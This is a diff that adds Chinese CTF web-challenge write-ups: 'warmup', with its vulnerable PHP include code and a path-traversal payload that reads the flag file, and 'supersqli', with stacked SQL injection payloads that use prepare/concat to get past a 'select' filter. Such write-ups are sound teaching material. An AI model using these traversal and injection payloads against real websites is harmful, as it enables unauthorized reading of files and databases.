@@ -530,4 +530,135 @@ data 协议上传 base64 加密后内容：`data://text/plain;base64, JTNDJTNGcG
 
 <br>
 
-###
+### warmup
+
+题解：路径查找
+
+```php
+<?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&$page)
+        {
+            // 白名单，即我们可以访问的两个php文件
+            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+
+            // 如果page没设置或者不是字符串类型的，报错
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it";
+                return false;
+            }
+
+            // 如果page值在白名单内，正确
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+
+    if (! empty($_REQUEST['file'])
+        && is_string($_REQUEST['file'])
+        && emmm::checkFile($_REQUEST['file'])
+    ) {
+        include $_REQUEST['file'];
+        exit;
+    } else {
+        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
+    }
+?>
+```
+
+<br>
+
+**知识点解析**
+
+`mb_substr(a,b,c)` 从字符串 a 中截取从索引 b 到 c 的一段子字符串  
+`mb_subpos(a,b)` 在字符串 a 中查找字符串 b 首次出现的索引
+
+> 根据文中代码展示的是提取问号前面的字符串
+
+`$_page = urldecode($page);`  
+表示对变量 page 进行一次 url 解码；  
+我们知道，url 在传递过程会执行一次加密操作，而传输给后端又会执行一次解密过程；  
+故我们一旦看到 php 代码中含有 urldecode，大概率需要我们加密两次才会返回正确答案
+
+> 这题比较特殊，仅需加密一次即可
+
+<br>
+
+**答案**
+
+直接顺着文件路径一直查找到根目录下的 flag 文件即可
+
+> 答案：`?file=hint.php?../../../../../../../../../../../../../ffffllllaaaagggg`
+
+<br>
+
+### supersqli
+
+题解：堆叠注入
+
+判断三部曲：
+
+1. 判断是否为单引号注入：成功
+2. order by 判断列数：2 列
+3. union select 联合查询尝试：失败，无法查询，被过滤掉了
+
+<br>
+
+既然无法使用联合查询，则改用堆叠注入
+
+首先查询一下所有数据库：  
+`1' ;show databases -- -`
+
+进入关键数据库 `supersqli` 并查询数据表  
+`1' ;use supersqli;show tables -- -`
+
+进入关键数据表 `1919810931114514` 并查询所有列  
+（注：查询纯数字或关键字的表名、列名必须要加反引号或者单引号）
+
+```
+-1' ;use supersqli;show columns from `1919810931114514`;%23
+
+```
+
+<br>
+
+此时已经查明 flag 存在的位置，且因为 select 被过滤掉了，故改用预处理的方法绕过 select 执行查询
+
+格式：`prepare 任意名称 from concat(连接好的查询语句);execute 前面定义的名称 -- -`
+
+```
+1';prepare demo from concat('s','elect',' * from `1919810931114514`');execute demo -- -
+
+```
+
+<br>
+
+> 成功拿到 flag：flag{c168d583ed0d4d7196967b28cbd0b5e9}
+
+<br>
+
+### Web_python_template_injection
